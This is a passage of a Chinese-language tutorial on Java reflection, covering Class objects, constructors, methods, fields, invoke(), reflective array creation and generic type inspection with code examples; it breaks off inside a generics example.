        <content type="html"><![CDATA[<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>Java反射(<code>Reflection</code>)机制就是在运行状态中，对于任意一个类，都能够知道这个类的属性和方法。对于任意一个对象能够调用它的任意一个属性和方法。这种动态获取的信息和动态调用对象的方法的功能称为Java语言的反射机制。Java程序中一般的对象的类型都是在编译期就确定下来的，而Java反射机制可以动态地创建对象并调用其属性，这样的对象的类型在编译期是未知的。所以我们可以通过反射机制直接创建对象，即使这个对象的类型在编译期是未知的。</p><p>反射的核心是JVM在<strong>运行时</strong>才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。反射机制就是通过<code>java.lang.Class</code>类来实现的，在Java中，Object 类是所有类的根类，而Class类就是描述Java类的类。</p><blockquote><p><strong>注</strong>：因为Class类也是类，所以Object也包括Class类。</p></blockquote><h3 id="2-主要功能"><a href="#2-主要功能" class="headerlink" title="2. 主要功能"></a>2. 主要功能</h3><p>Java反射框架主要提供以下功能：</p><ul><li>在运行时判断任意一个对象所属的类；</li><li>在运行时构造任意一个类的对象；</li><li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li><li>在运行时调用任意一个对象的方法；</li><li>修改构造函数、方法、属性的可见性。</li></ul><h3 id="3-主要用途"><a href="#3-主要用途" class="headerlink" title="3. 主要用途"></a>3. 主要用途</h3><p><strong>反射最重要的用途就是开发各种通用框架</strong>。很多框架（比如Spring）都是配置化的（比如通过XML文件配置JavaBean,Action之类的），为了保证框架的通用性，它们可能需要根据配置文件加载不同的对象或类，调用不同的方法，这个时候就必须用到反射——运行时动态加载需要加载的对象。对与框架开发人员来说，反射虽小但作用非常大，它是各种容器实现的核心。</p><h2 id="二、反射的使用"><a href="#二、反射的使用" class="headerlink" title="二、反射的使用"></a>二、反射的使用</h2><h3 id="1-获取Class对象"><a href="#1-获取Class对象" class="headerlink" title="1. 获取Class对象"></a>1. 获取Class对象</h3><p>反射的各种功能都需要通过Class对象来实现，因此，需要知道如何获取Class对象，主要有以下几种方式。</p><h4 id="使用-Class-forName-的静态方法"><a href="#使用-Class-forName-的静态方法" class="headerlink" title="使用 Class.forName() 的静态方法"></a>使用 Class.forName() 的静态方法</h4><p><code>Class.forName(String className)</code>方法可以通过类或接口的名称（一个字符串或完全限定名）来获取对应的Class对象。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.blinkfox.Zealot"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="直接获取某个类的class-最安全-性能最好"><a href="#直接获取某个类的class-最安全-性能最好" class="headerlink" title="直接获取某个类的class(最安全/性能最好)"></a>直接获取某个类的class(最安全/性能最好)</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="调用某个对象的-getClass-方法"><a href="#调用某个对象的-getClass-方法" class="headerlink" title="调用某个对象的 getClass() 方法"></a>调用某个对象的 getClass() 方法</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-判断是否为某个类的实例"><a href="#2-判断是否为某个类的实例" class="headerlink" title="2. 判断是否为某个类的实例"></a>2. 判断是否为某个类的实例</h3><p>一般地，我们用<code>instanceof</code>关键字来判断是否为某个类的实例。同时我们也可以借助反射中Class对象的<code>isInstance()</code>方法来判断是否为某个类的实例，它是一个Native方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">boolean</span> <span class="token function">isInstance</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-创建实例"><a href="#3-创建实例" class="headerlink" title="3. 创建实例"></a>3. 创建实例</h3><p>通过反射来生成对象主要有两种方式。</p><h4 id="使用Class对象的newInstance-方法"><a href="#使用Class对象的newInstance-方法" class="headerlink" title="使用Class对象的newInstance()方法"></a>使用Class对象的newInstance()方法</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span class="token class-name">Object</span> str <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance-方法"><a href="#通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance-方法" class="headerlink" title="通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法"></a>通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 获取String所对应的Class对象</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span class="token comment">// 获取String类带一个String参数的构造器</span><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 根据构造器创建实例</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"23333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：这种方法可以用指定的构造器构造类的实例。</p></blockquote><h3 id="4-获取方法"><a href="#4-获取方法" class="headerlink" title="4. 获取方法"></a>4. 获取方法</h3><p>获取某个Class对象的方法集合，主要有以下几个方法：</p><ul><li><code>getDeclaredMethods()</code>方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SecurityException</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>getMethods()</code>方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SecurityException</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>getMethod()</code>方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象。</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Method</span> <span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>代码示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span>            <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token class-name">MethodClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> object <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> declaredMethods <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取MethodClass类的add方法</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//getMethods()方法获取的所有方法</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getMethods获取的方法："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//getDeclaredMethods()方法获取的所有方法</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethods获取的方法："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span> declaredMethods<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">MethodClass</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> fuck <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：通过<code>getMethods()</code>获取的方法可以获取到父类的方法,比如<code>java.lang.Object</code>下定义的各个方法。</p></blockquote><h3 id="5-获取构造方法"><a href="#5-获取构造方法" class="headerlink" title="5. 获取构造方法"></a>5. 获取构造方法</h3><p>获取类构造器的用法与上述获取方法的用法类似。主要是通过Class类的<code>getConstructor</code>方法得到<code>Constructor</code>类的一个实例，而Constructor类有一个<code>newInstance</code>方法可以创建一个对象实例:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Object</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> initargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>注</strong>：此方法可以根据传入的参数来调用对应的Constructor创建对象实例。</p></blockquote><h3 id="6-获取类的成员变量信息"><a href="#6-获取类的成员变量信息" class="headerlink" title="6. 获取类的成员变量信息"></a>6. 获取类的成员变量信息</h3><p>获取的方法同Method相似，主要是这几个方法，在此不再赘述：</p><ul><li><code>Field getField(String name)</code>: 访问公有的成员变量。</li><li><code>Field[] getDeclaredFields()</code>：所有已声明的成员变量。但不能得到其父类的成员变量。</li><li><code>Field[] getFields()</code>和<code>Field[] getDeclaredFields()</code>用法同上。</li></ul><h3 id="7-调用方法"><a href="#7-调用方法" class="headerlink" title="7. 调用方法"></a>7. 调用方法</h3><p>当我们从类中获取了一个方法后，我们就可以用invoke()方法来调用这个方法。invoke方法的原型为:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>代码示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span>            <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> klass <span class="token operator">=</span> <span class="token class-name">MethodClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">//创建 MethodClass 的实例</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> klass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取 MethodClass 类的add方法</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> klass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"add"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//调用 method 对应的方法 => add(1,4)</span>        <span class="token class-name">Object</span> result <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">MethodClass</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> fuck <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-利用反射创建数组"><a href="#8-利用反射创建数组" class="headerlink" title="8. 利用反射创建数组"></a>8. 利用反射创建数组</h3><p>数组在Java里是比较特殊的一种类型，它可以赋值给一个<code>Object Reference</code>。下面我们看一看利用反射创建数组的例子：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">testArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 使用`java.lang.reflect.Array`反射创建长度为25的字符串数组.</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> array <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 往数组里添加内容</span>    <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"Go"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"Scala"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"Clojure"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取某一项的内容</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、使用反射获取信息"><a href="#三、使用反射获取信息" class="headerlink" title="三、使用反射获取信息"></a>三、使用反射获取信息</h2><p>Class类提供了大量的实例方法来获取该Class对象所对应的详细信息，Class类大致包含如下方法，其中每个方法都包含多个重载版本，因此我们只是做简单的介绍，详细请参考<a href="https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html">JDK文档</a>。</p><h3 id="1-获取类内信息"><a href="#1-获取类内信息" class="headerlink" title="1. 获取类内信息"></a>1. 获取类内信息</h3><ul><li>构造器: <code>Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes)</code></li><li>包含的方法: <code>Method getMethod(String name, Class&lt;?&gt;... parameterTypes)</code></li><li>包含的属性: <code>Field getField(String name)</code></li><li>包含的Annotation: <code>&lt;A extends Annotation&gt; A getAnnotation(Class&lt;A&gt; annotationClass)</code></li><li>内部类: <code>Class&lt;?&gt;[] getDeclaredClasses()</code></li><li>外部类: <code>Class&lt;?&gt; getDeclaringClass()</code></li><li>所实现的接口: <code>Class&lt;?&gt;[] getInterfaces()</code></li><li>修饰符: <code>int getModifiers()</code></li><li>所在包: <code>Package getPackage()</code></li><li>类名: <code>String getName()</code></li><li>简称: <code>String getSimpleName()</code></li></ul><h3 id="2-判断类本身信息的方法"><a href="#2-判断类本身信息的方法" class="headerlink" title="2. 判断类本身信息的方法"></a>2. 判断类本身信息的方法</h3><ul><li>是否注解类型: <code>boolean isAnnotation()</code></li><li>是否使用了该Annotation修饰: <code>boolean isAnnotationPresent(Class&lt;? extends Annotation&gt; annotationClass)</code></li><li>是否匿名类: <code>boolean isAnonymousClass()</code></li><li>是否数组: <code>boolean isArray()</code></li><li>是否枚举: <code>boolean isEnum()</code></li><li>是否原始类型: <code>boolean isPrimitive()</code></li><li>是否接口: <code>boolean isInterface()</code></li><li>obj是否是该Class的实例: <code>boolean isInstance(Object obj)</code></li></ul><h3 id="3-使用反射获取泛型信息"><a href="#3-使用反射获取泛型信息" class="headerlink" title="3. 使用反射获取泛型信息"></a>3. 使用反射获取泛型信息</h3><p>为了通过反射操作泛型以迎合实际开发的需要, Java新增了<code>java.lang.reflect.ParameterizedType</code>、<code>java.lang.reflect.GenericArrayType</code>、<code>java.lang.reflect.TypeVariable</code>、<code>java.lang.reflect.WildcardType</code>几种类型来代表不能归一到Class类型但是又和原始类型同样重要的类型。</p><ul><li><code>ParameterizedType</code>: 一种参数化类型, 比如Collection<String></li><li><code>GenericArrayType</code>: 一种元素类型是参数化类型或者类型变量的数组类型</li><li><code>TypeVariable</code>: 各种类型变量的公共接口</li><li><code>WildcardType</code>: 一种通配符类型表达式, 如<code>?</code>、<code>? extends Number</code>、<code>? super Integer</code></li></ul><p>代码示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> objectMap<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">></span></span> map<span class="token punctuation">,</span> <span class="token class-name">String</span> string<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">,</span> <span class="token class-name">Bean</span><span class="token punctuation">></span></span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 测试属性类型     *     * @throws NoSuchFieldException     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testFieldType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token class-name">Client</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"objectMap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Type</span> gType <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getGenericType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 打印type与generic type的区别</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>gType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"**************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>gType <span class="token keyword">instanceof</span> <span class="token class-name">ParameterizedType</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ParameterizedType</span> pType <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ParameterizedType</span><span class="token punctuation">)</span> gType<span class="token punctuation">;</span>            <span class="token class-name">Type</span><span class="token punctuation">[</span><span class="token punctuation">]</span> types <span class="token operator">=</span> pType<span class="token punctuation">.</span><span class="token function">getActualTypeArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Type</span> type <span 